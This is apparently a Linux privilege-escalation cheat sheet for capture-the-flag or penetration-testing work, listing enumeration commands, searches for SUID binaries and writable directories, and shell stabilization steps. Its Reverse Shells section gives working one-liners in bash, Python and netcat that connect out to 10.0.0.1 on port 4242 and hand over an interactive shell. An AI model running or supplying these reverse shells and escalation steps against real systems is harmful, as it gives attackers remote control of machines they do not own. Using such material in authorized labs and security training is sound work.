# Linux & PrivEsc Cheatsheet

## System Enumeration
- `uname -a`: Kernel version.
- `cat /etc/issue`: OS distribution.
- `id`: Current user and groups.
- `env`: Environment variables.

## Finding Files
- `find / -name flag.txt 2>/dev/null`: Find flag.
- `find / -perm -4000 2>/dev/null`: Find SUID binaries (run as owner, usually root).
- `find / -writable -type d 2>/dev/null`: Find writable directories.

## Network
- `netstat -antp`: Active connections.
- `ip a`: Network interfaces.
- `arp -a`: ARP table.

## Reverse Shells

### Bash
`bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`

### Python
`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

### Netcat
`nc -e /bin/sh 10.0.0.1 4242`
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f`

## TTY Upgrade (Stabilize Shell)
1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
2. `Ctrl+Z` (Background)
3. `stty raw -echo; fg`
4. `export TERM=xterm`
